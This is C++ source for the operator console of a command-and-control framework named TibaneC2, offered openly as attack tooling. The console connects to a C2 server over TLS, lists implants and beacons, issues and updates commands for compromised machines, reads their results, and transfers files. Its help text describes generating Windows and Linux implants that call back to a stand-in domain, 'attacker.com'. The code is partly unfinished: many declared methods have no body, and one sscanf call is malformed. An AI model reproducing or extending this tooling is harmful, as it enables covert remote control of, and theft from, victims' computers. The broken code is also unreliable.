#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <string>
#include <filesystem>
#include <readline/readline.h>
#include <readline/history.h>
#include <crypt.h>
#include <sys/stat.h>
#include <unistd.h>
#include <cjson/cJSON.h>
#include <stdbool.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <fcntl.h>
#include <openssl/err.h>
#include <openssl/ssl.h>

extern "C" {
    #include "./libs/libdisplay.h"
}


#define BUFFER_SIZE 0x100
#define MAX_SIZE 0x999999
#define HELP_SIZE 0x400

#define FILE_CHUNK 0x256

char IP[BUFFER_SIZE];
int PORT;
char current_operator[BUFFER_SIZE];

const char tibane_shell_help[HELP_SIZE] = "\n[*] Tibane-Shell Usage [*]\n"
                                        "   whoami : shows logged in operator\n"
                                        "   implants : show all active implants\n"
                                        "   beacons : show all active beacons\n"
                                        "   get-implant -os=[windows/linux] -channel=[https/tls] -domain=attacker.com:443 -o=/path/to/implant : generate implant\n"
                                        "   list-tasks : shows all tasks for all implants\n"    
                                        "   beacon [id] : interactive shell for selected beacon\n"
                                        "   use [id] : same as beacon\n"
                                        "   upload [file path] : upload file to server\n"
                                        "   download [operator/implant] [file_to_download] [path to store] : download file from server\n"
                                        "   files : show all files from server\n"
                                        "   quit, q, exit : exit the program\n" 
                                        "   \n---------------------------------\n";

const char beacon_shell_help[HELP_SIZE] = "\n[*] Tibane-shell (Beacon Usage) [*]\n\n"                              
                                    "   new-task [task] : Issue new task for the beacon\n"
                                    "   list-tasks : Show all information abouts tasks for beacon\n"
                                    "   response-task [task id] : show response for specific task\n"
                                    "   update-task [id] [cmd] : update task (only if it is not completed)\n"
                                    "   \n-----------------------------------\n";


void banner() {
printf("\n");    
printf("░▒▓████████▓▒░▒▓█▓▒░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░▒▓██████▓▒░░▒▓███████▓▒░  \n");
printf("   ░▒▓█▓▒░   ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░ \n");
printf("   ░▒▓█▓▒░   ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░             ░▒▓█▓▒░ \n");
printf("   ░▒▓█▓▒░   ░▒▓█▓▒░▒▓███████▓▒░░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓██████▓▒░░▒▓█▓▒░       ░▒▓██████▓▒░  \n");
printf("   ░▒▓█▓▒░   ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░      ░▒▓█▓▒░        \n");
printf("   ░▒▓█▓▒░   ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        \n");
printf("   ░▒▓█▓▒░   ░▒▓█▓▒░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓██████▓▒░░▒▓████████▓▒░ \n");
printf("                        https://github.com/tibane0/TibaneC2\n");
printf("======================================================================================\n");                                                                                                                 
printf("[+] Welcome to tibane shell | type 'help' for options \n\n");
}


class Communicate {
    private:
    int sock;
    SSL_CTX *ctx;
    SSL *ssl;

    public:
    Communicate();

    void send_json();

    char *recv_json(const char *json_str);

    bool authenticate();

    bool quit();

    bool verify_id(const char* id);

    char *view_files(const char* dir);

    int file_upload(const char* path);
    int file_download(const char* filename, const char* filepath, const char* dir);

    void new_task(const char* id, const char* command);

    bool update_task(const char* id, int task_id, const char* command);

    char *get_info(const char* table);

    char *list_tasks(const char *id);

    char *get_response_task(const char *id, int task_id);

};


class Shell {

    public:
    

    char *shell_command_generator(const char* text, int state);
    char *beacon_shell_command_generator(const char* text, int state);

    char **beacon_shell_completetion(const char* text, int start, int end);
    char **main_shell_completetion(const char* text, int start, int end);

    void main_shell(Communicate com);
    void beacon_shell(const char* id, Communicate com);

    void process_shell_commands(const char* cmd, Communicate com);
    void process_beacon_shell_commands(const char* id, const char* cmd, Communicate com);
};

int configuration();

int main(int argc, char *argv[]) {
    if (argc != 3) {
        if (configuration() == -1) {
            printf("\nUSAGE %s [IP] [PORT]\n\nOR\n\nInclude the tibane_console_conf.json file in same directory\n\n", argv[0]);
            return EXIT_FAILURE;
        }
    } else {
        strncpy(IP, argv[1], sizeof(IP));
        PORT = atoi(argv[2]);
    }

    banner();

    Communicate com;
    Shell sh;

    sh.main_shell(com);

    return 0;
}

char** Shell::main_shell_completetion(const char* text, int start, int end) {
    rl_attempted_completion_over = 1;
    return rl_completion_matches(text, shell_command_generator);
}

char* Shell::shell_command_generator(const char* text, int state) {
        static const char* commands[] = {
        "implants", "beacon", "list-tasks", "whoami", "download", "upload", "exit", "quit", "q", "use", "ls", NULL
    };
    
    static int list_index, len;
    const char* name;

    if (!state) {
        list_index = 0;
        len = strlen(text);
    }

    while ((name = commands[list_index++])) {
        if (strncmp(name, text, len) == 0) {
            return strdup(name);
        }
    }
    return NULL;
}


void Shell::main_shell(Communicate com) {
    //rl_attempted_completion_function = main_shell_completetion;
    using_history();

    while (true) {
        char *cmd = readline("\n[ tibane-shell ] $ ");
        if (!cmd) {
            printf("CTRL + D\n");
            break;
        } else if (strlen(cmd) == 0) {
            free(cmd);
            continue;
        }

        add_history(cmd);
        process_shell_commands(cmd, com);
        free(cmd);
    }
}


void Shell::process_shell_commands(const char* cmd, Communicate com) {
    if (strcmp(cmd, "implants") == 0) {
        char *data = com.get_info("Implants");
        if (!data) {
            printf("\n[-] NO DATA ABOUT IMPLANTS \n");
            return;
        }
        DisplayAllAgents(data);
        free(data);
        data = NULL;
    } else if (strcmp(cmd, "exit") == 0 || strcmp(cmd, "q") == 0 || strcmp(cmd, "quit") == 0) {
        com.quit();
        exit(0);
    } else if (strcmp(cmd, "list-tasks") == 0) {
        char *data = com.get_info("list-tasks");
        if (!data) {
            printf("\n[-] NO DATA ABOUT IMPLANTS \n");
            return;
        }
        DisplayAllTasks(data);
        free(data);
        data = NULL;
    } else if (strcmp(cmd, "whoami") == 0) {
        printf("\n[+] %s \n", current_operator);
    } else if (strncmp(cmd, "ls", 2) == 0) {
        char dir[BUFFER_SIZE];
        if (sscanf(cmd, "ls %255s", dir) != 1) {
            printf("\n[-] use : files [operator/implant]\n");
            return;
        }
        if (strcmp(dir, "operator") != 0 && strcmp(dir, "implant") != 0) {
            printf("\n[-] usage : files [operator/implant] \nNot : %s\n", dir);
            return;        
        }

        char *files = com.view_files(dir);
        if (!files) {
            printf("\n[-] Could Not display files\n");
            return;
        }
        DisplayFiles(files);
        free(files);
        files = NULL;
    } else if (strncmp(cmd, "upload", 6) == 0 ) {
        char file_path[BUFFER_SIZE];
        if (sscanf(cmd, "upload %255s", file_path) != 1) {
            printf("\n[-] Use : upload [file path]\n");
            return;
        }
        if (com.file_upload(file_path) == -1) {
            printf("\n[-] Could Not Send File\n");
            return;
        } 

    } else if (strncmp(cmd, "download", 8) == 0) {
        char file_d[BUFFER_SIZE], file_store[BUFFER_SIZE], dir[BUFFER_SIZE];
        if (sscanf(cmd, "download %255s %255s %255s", dir, file_d, file_store) != 3) {
            printf("\n[-] use : download [operator/implant] [file_to_download] [path to store]\n");
            return;
        }
        if (com.file_download(file_d, file_store, dir) == -1) {
            printf("\n[-] Could not download file\n");
            return;
        }
    } else if (strncmp(cmd, "beacon", 6) == 0 || strncmp(cmd, "use", 3) == 0 ) {
        char id[9];
        if (sscanf(cmd, "beacon %8s", id) == 1) {
            beacon_shell(id, com);
        } else if (sscanf(cmd, "use %8s", id) == 1) {
            beacon_shell(id, com);
        }
    } else {
         printf("%s", tibane_shell_help);
    }
}


void Shell::beacon_shell(const char* id, Communicate com) {
    if (com.verify_id(id) == false) {
        printf("[-] ID does not exist\n[-] Back to Home Shell\n");
        return;
    }

    printf("\n[+] Using Agent ID : %s \n", id);

    //rl_attempted_completion_function =      beacon_shell_completion;
    HIST_ENTRY** orig_history = history_list();
    while (true) {
        char prompt[BUFFER_SIZE];
            snprintf(prompt, sizeof(prompt), "\n[ tibane-shell ] (%s) $ ", id);
            char *cmd = readline(prompt);
        if (!cmd) {
            printf("\n[-] Back to home shell \n");
            return;
        } else if (strlen(cmd) == 0) {
            free(cmd);
            continue;
        }
        add_history(cmd);
        process_beacon_shell_commands(id, cmd, com);
        free(cmd);
    }
}

void Shell::process_beacon_shell_commands(const char* id, const char* cmd, Communicate com) {
    if (strcmp(cmd, "exit") == 0 ||  strcmp(cmd, "q") == 0 || strcmp(cmd, "quit") == 0) {
        printf("\n[-] Back to home shell \n");
    } else if (strcmp(cmd, "list-tasks") == 0) {
        char *data = com.list_tasks(id);
        if (!data) {
            printf("\n [-] NO DATA RELATED TO TASKS FOR %s \n\n", id);
            return;
        }
        DisplayTasksPerAgent(data);
        free(data);
        data = NULL;    
    } else if (strncmp(cmd, "new-task", 8) == 0) {
        char task[BUFFER_SIZE];
        if (sscanf(cmd, "new-task %255s", task) != 1) {
            printf("\n[-] Failed to add task\n");
            return;
        }
        com.new_task(id, task);
        printf("\n[+] Added Task \n");
    } else if (strncmp(cmd, "response-task", strlen("response-task")) == 0) {
        int task_id;
        if (sscanf(cmd, "response-task %d", task_id) != 1) {
             printf("\n[-] MUST HAVE TASK ID\n");
            return;
        }
        char *data = com.get_response_task(id, task_id);
        if (!data) {
            printf("\n[-] Failed to get response task\n");
            return;
        }
        DisplayCommandResponse(data);
        free(data);
        data = NULL;
    } else if (strcmp(cmd, "whoami") == 0) {
         printf("\n[+] %s \n", current_operator);
    } else if (strncmp(cmd, "update-task", strlen("update-task")) == 0) {
        int task_id;
        char command[BUFFER_SIZE];
        if (sscanf(cmd, "update-task %d %s", &task_id, command) != 2) {
            printf("\n[-] MUST HAVE TASK ID AND NEW COMMAND \n [*] update-task [id] [cmd]\n");
            return;
        }
        if (com.update_task(id, task_id, command)) {
            printf("\n[+] TASK UPDATED");
        } else {
            printf("\n[-] TASK NOT UPDATED\n");
        }
                
    }
}






























Communicate::Communicate() {
        printf("\n[*] Connecting to %s : %d \n", IP, PORT);
        SSL_library_init();
        OpenSSL_add_all_algorithms();
        SSL_load_error_strings();
        ctx = SSL_CTX_new(TLS_client_method());
        int status;
        struct sockaddr_in serv_addr;
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(PORT);

        sock = socket(AF_INET, SOCK_STREAM, 0);


        if (inet_pton(AF_INET, IP, &serv_addr.sin_addr) <= 0) {
            printf("\n[-] Invalid IP Address\n");
            exit(0);
        }

        int tries = 0;
        do {
            if ((status = connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr))) < 0) {
               printf("\n[-] Connection Failed \n");
               sleep(3);
               tries++;
               continue;
            } else {
                break;
            }
        } while (tries < 3);
        if (tries >= 3) {
            exit(0);
        }

        ssl = SSL_new(ctx);
        SSL_set_fd(ssl, sock);
        SSL_connect(ssl); 
}